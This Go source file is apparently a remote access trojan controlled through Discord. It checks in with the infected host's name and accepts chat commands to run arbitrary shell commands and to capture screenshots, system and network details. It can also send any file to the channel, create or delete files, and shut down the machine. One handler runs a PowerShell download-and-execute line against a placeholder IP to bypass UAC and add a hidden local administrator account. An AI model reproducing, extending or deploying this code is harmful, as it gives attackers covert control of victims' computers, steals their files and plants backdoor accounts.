package main

import (
    "fmt"
    "io/ioutil"
    "log"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
    "time"
    "flag"
    "image/png"	 
    "github.com/kbinani/screenshot"    
    "github.com/bwmarrin/discordgo"
)

var (
    Token     string
    ChannelID string
)


func main() {
     
    // Parse command line arguments for token and channel ID
    flag.StringVar(&Token, "token", "", "Discord Bot Token")
    flag.StringVar(&ChannelID, "channel", "", "Channel ID to send messages to")
    flag.Parse()

    if Token == "" || ChannelID == "" {
        fmt.Println("Please provide both token and channel ID.")
        return
    }

    dg, err := discordgo.New("Bot " + Token)
    if err != nil {
        fmt.Println("Error creating Discord session:", err)
        return
    }

    // Register the message handler
    dg.AddHandler(messageHandler)

    err = dg.Open()
    if err != nil {
        fmt.Println("Error opening connection:", err)
        return
    }

    // Notify the channel about bot startup
    go func() {
        time.Sleep(2 * time.Second)
        hostNameMsg := fmt.Sprintf("%s checking in.", getHostName())
        dg.ChannelMessageSendEmbed(ChannelID, &discordgo.MessageEmbed{Description: hostNameMsg})
    }()

    fmt.Println("Bot is now running. Press CTRL+C to exit.")
    select {} // Keep the program running until interrupted
}

func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {
    if m.Author.ID == s.State.User.ID {
        return
    }

    hasAdminRole := false
    for _, roleID := range m.Member.Roles {
        role, _ := s.State.Role(m.GuildID, roleID)
        if role.Name == "Administrator" {
            hasAdminRole = true
            break
        }
    }

    if hasAdminRole {
        switch {
        case strings.HasPrefix(m.Content, "$custom_command"):
            handleCustomCommand(s, m)
        case strings.HasPrefix(m.Content, "$cd"):
            handleCdCommand(s, m)
        case strings.HasPrefix(m.Content, "$screenshot"):
            handleScreenshotCommand(s, m)
        case strings.HasPrefix(m.Content, "$ip"):
            handleIpCommand(s, m)
        case strings.HasPrefix(m.Content, "$sysinfo"):
            handleSysInfoCommand(s, m)
        case strings.HasPrefix(m.Content, "$filegrab"):
            handleFileGrabCommand(s, m)
        case strings.HasPrefix(m.Content, "$fodhelper"):
            handleFodHelperCommand(s, m)
        case strings.HasPrefix(m.Content, "$shutdown"):
            handleShutdownCommand(s, m)
        case strings.HasPrefix(m.Content, "$restart"):
            handleRestartCommand(s, m)
        case strings.HasPrefix(m.Content, "$exit"):
            os.Exit(0)
        case strings.HasPrefix(m.Content, "$list"):
            handleListFilesCommand(s, m)
        case strings.HasPrefix(m.Content, "$pwd"):
            handlePwdCommand(s, m)
        case strings.HasPrefix(m.Content, "$ping"):
            handlePingCommand(s, m)
        case strings.HasPrefix(m.Content, "$createfile"):
            handleCreateFileCommand(s, m)
        case strings.HasPrefix(m.Content, "$delete"):
            handleDeleteCommand(s, m)
        }
    }
}

func handleCustomCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
            Title:       "Error",
            Description: "Please enter a command to run.",
            Color:       0xFF0000,
        })
        return
    }
    command := strings.Join(args[1:], " ")
    output, err := exec.Command("cmd.exe", "/C", command).CombinedOutput()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```%s```", output))
}

func handleCdCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
            Title:       "Error",
            Description: "Please enter a directory.",
            Color:       0xFF0000,
        })
        return
    }
    directory := strings.Join(args[1:], " ")
    err := os.Chdir(directory)
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error changing directory: %v", err))
        return
    }
    s.ChannelMessageSendEmbed(m.ChannelID, &discordgo.MessageEmbed{
        Title:       "Directory Changed",
        Description: directory,
        Color:       0x00FF00,
    })
}


func handleScreenshotCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    // Get the number of displays
    n := screenshot.NumActiveDisplays()
    if n <= 0 {
        s.ChannelMessageSend(m.ChannelID, "No display found.")
        return
    }

    // Capture the first display's screenshot
    img, err := screenshot.CaptureDisplay(0) // Change index for different displays
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, "Error capturing screenshot.")
        return
    }

    // Create a file for the screenshot
    filePath := "C:\\Users\\Public\\screenshot.png"
    file, err := os.Create(filePath)
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, "Error creating screenshot file.")
        return
    }
    defer file.Close()

    // Encode the image to PNG format
    if err := png.Encode(file, img); err != nil {
        s.ChannelMessageSend(m.ChannelID, "Error saving screenshot.")
        return
    }

    // Send the file in Discord channel
    file, err = os.Open(filePath) // Reopen to send
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, "Error opening screenshot file.")
        return
    }
    defer os.Remove(filePath) // Clean up after sending the file
    defer file.Close()

    s.ChannelFileSend(m.ChannelID, "screenshot.png", file)
}

func handleIpCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    output, err := exec.Command("ipconfig").CombinedOutput()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error retrieving IP info: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```%s```", output))
}

func handleSysInfoCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    output, err := exec.Command("systeminfo").CombinedOutput()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error retrieving system info: %v", err))
        return
    }
    if len(output) >= 2000 {
        filePath := "C:\\Users\\Public\\sysinfo.txt"
        err := ioutil.WriteFile(filePath, output, 0644)
        if err != nil {
            s.ChannelMessageSend(m.ChannelID, "Error writing sysinfo to file.")
            return
        }
        defer os.Remove(filePath)
        file, err := os.Open(filePath)
        if err == nil {
            s.ChannelFileSend(m.ChannelID, "sysinfo.txt", file)
            file.Close()
        }
    } else {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```%s```", output))
    }
}

func handleFileGrabCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSend(m.ChannelID, "Please enter a file path.")
        return
    }
    filePath := strings.Join(args[1:], " ")
    file, err := os.Open(filePath)
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error opening file: %v", err))
        return
    }
    defer file.Close()
    s.ChannelFileSend(m.ChannelID, filepath.Base(filePath), file)
}

func handleFodHelperCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    // Make sure this command is safe and intended for use.
    command := "powershell -c iex (new-object net.webclient).downloadstring('http://your_ip:port/helper.ps1');helper -custom 'cmd.exe /c net user test123 Password123 /add & net localgroup administrators test123 /add'"
    output, err := exec.Command("powershell", "-c", command).CombinedOutput()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error executing FodHelper command: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```%s```", output))
}

func handleShutdownCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    _, err := exec.Command("shutdown", "-s", "-t", "0").Output()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error initiating shutdown: %v", err))
    }
}

func handleRestartCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    _, err := exec.Command("shutdown", "-r", "-t", "0").Output()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error initiating restart: %v", err))
    }
}

func handleListFilesCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    files, err := ioutil.ReadDir(".")
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error reading directory: %v", err))
        return
    }
    var fileList []string
    for _, file := range files {
        fileList = append(fileList, file.Name())
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Files in the current directory:\n%s", strings.Join(fileList, "\n")))
}

func handlePwdCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    cwd, err := os.Getwd()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error getting current directory: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Current directory: %s", cwd))
}

func handlePingCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSend(m.ChannelID, "Please enter a hostname to ping.")
        return
    }
    host := args[1]
    output, err := exec.Command("ping", host).CombinedOutput()
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error pinging host: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("```%s```", output))
}

func handleCreateFileCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSend(m.ChannelID, "Please enter a filename to create.")
        return
    }
    filePath := args[1]
    content := ""
    if len(args) > 2 {
        content = strings.Join(args[2:], " ")
    }
    err := ioutil.WriteFile(filePath, []byte(content), 0644)
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error creating file: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("File '%s' created successfully.", filePath))
}

func handleDeleteCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
    args := strings.Fields(m.Content)
    if len(args) < 2 {
        s.ChannelMessageSend(m.ChannelID, "Please enter a filename to delete.")
        return
    }
    filePath := args[1]
    err := os.Remove(filePath)
    if err != nil {
        s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error deleting file: %v", err))
        return
    }
    s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("File '%s' deleted successfully.", filePath))
}

func getHostName() string {
    hostName, err := os.Hostname()
    if err != nil {
        log.Printf("Error getting hostname: %s", err)
        return "Unknown Host"
    }
    return hostName
}
